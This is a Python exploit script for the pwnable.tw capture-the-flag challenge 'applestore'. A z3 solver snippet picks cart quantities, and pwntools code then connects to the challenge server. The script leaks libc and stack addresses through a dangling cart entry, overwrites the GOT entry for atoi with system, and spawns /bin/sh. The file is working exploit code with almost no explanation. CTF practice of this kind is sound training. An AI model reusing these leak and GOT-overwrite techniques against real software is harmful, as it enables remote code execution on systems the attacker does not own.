"""
from z3 import *

p = [199, 299, 499, 399, 199]
x =[]
s = Solver()
for i in range(len(p)):
	v = Int('x{}'.format(i))
	s.add(v >= 0)
	x.append(v*p[i])
s.add(sum(x) == 0x1C06)
if s.check():
	print s.model()

# [x3 = 0, x2 = 0, x1 = 20, x4 = 0, x0 = 6]
"""

from pwn import *

# io = process("./applestore")
io = remote("chall.pwnable.tw", 10104)
e = ELF("./applestore")
# l = ELF("/lib32/libc-2.27.s")
l = ELF("./libc_32.so.6")

def choose(i):
	if type(i) == int:
		io.sendlineafter("> ", str(i))
	elif type(i) == str:
		io.sendafter("> ", i)
def yes():
	io.sendlineafter("Let me check your cart. ok? (y/n)", 'y')
	
def addItem(i):
	choose(2)
	io.sendlineafter("Device Number> ", str(i))

for i in range(6):
	addItem(1)
for i in range(20):
	addItem(2)

# how to leak libc
choose(5)
yes()

choose(3)
payload = '27' + p32(e.got['atoi']) + '\x00'*0xC
io.sendafter("Item Number> ", payload)
atoi_at = u32(io.recvline().split(":")[1][:4])
l.address = atoi_at - l.symbols['atoi']
system_at = l.symbols['system']

print "atoi_at {}".format(hex(atoi_at))

# how to leak stack 
choose(3)
payload = '27' + p32(l.symbols['environ']) + '\x00'*0xC
io.sendafter("Item Number> ", payload)
stack_at = u32(io.recvline().split(":")[1][:4])
ebp_at = stack_at - 0x104

print "stack_at {}".format(hex(stack_at))
print "ebp_at {}".format(hex(ebp_at))

# how to overwrite got atoi
choose(3)
payload = '27' + p32(stack_at)*2  + p32(ebp_at - 0xC) + p32(e.got['atoi'] + 0x22)	# ebp = got(atoi) - 0x22
io.sendafter("Item Number> ", payload)

choose(p32(system_at) + ';/bin/sh;' + '\x00')
io.interactive()
